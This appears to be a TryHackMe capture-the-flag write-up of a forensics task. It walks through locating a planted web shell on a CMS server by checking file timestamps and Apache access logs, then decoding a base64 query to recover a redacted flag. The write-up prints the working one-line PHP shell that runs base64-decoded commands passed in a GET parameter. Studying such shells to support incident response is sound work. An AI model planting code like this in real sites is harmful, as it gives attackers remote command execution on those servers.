# thm-infinity_shell

## TryHackMe: Infinity Shell — Write-Up

**Difficulty:** Easy
**Category:** Forensics
**Time to Complete:** \~30 minutes

---

### 📘 Objective

Investigate a compromised web server to identify a malicious web shell and retrieve the flag left behind by the attacker.

---

### 💾 Target Info

* **Target IP:** `target ip`
* **Application:** Infinity Shell v0.6
* **Task:** Find the flag left behind by the attacker.

---

## 🧱️ Step-by-Step Walkthrough

### 🛡️ Step 1: Web Server Enumeration

Accessed the web server at **`target ip`**.
Found a CMS directory at:

```bash
/var/www/html/CMSsite-master
```

### 🔍 Step 2: PHP File Review

Searched for all PHP files and sorted them by modification time:

```bash
find . -type f -name "*.php" -exec ls -lh {} \; | sort -k6,7
```

Found a suspicious file:

```bash
./img/images.php
```

Size was 48 bytes and had a recent timestamp.

### 🤖 Step 3: Inspecting the Web Shell

Inspected contents:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

It's a base64-decoding command execution shell.

### 📝 Step 4: Apache Log Forensics

Analyzed access logs:

```bash
cat /var/log/apache2/other_vhosts_access.log.1 | grep "images.php" -C 2
```

Found attacker payload:

```
GET /CMSsite-master/img/images.php?query=<REDACTED_BASE64>
```

Decoded it:

```bash
echo '<REDACTED_BASE64>' | base64 -d
```

Output:

```
echo '<REDACTED_FLAG>'
```

---

### 🏁 Flag

```
<REDACTED_FLAG>
```

---

## 🧐 Summary Table

| Key Detail      | Value                          |
| --------------- | ------------------------------ |
| Shell Location  | `/img/images.php`              |
| Shell Mechanism | base64-decoded `system()` call |
| Access Method   | `query` GET parameter          |
| Flag Retrieved  | `<REDACTED_FLAG>`              |

---

